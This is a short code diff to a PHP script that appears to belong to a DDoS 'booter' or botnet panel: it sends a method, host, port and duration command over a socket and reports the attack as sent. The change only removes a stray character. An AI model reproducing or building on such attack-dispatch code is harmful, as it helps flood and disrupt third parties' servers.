@@ -44,4 +44,4 @@ $command = "!* $method $host $port $time 32 1337 1";
 fwrite($socket, $command . "\n");
 fclose($socket);
 echo htmlsc("Attack sent to $host:$port for $time seconds using method $method!\n");
-?>s
+?>
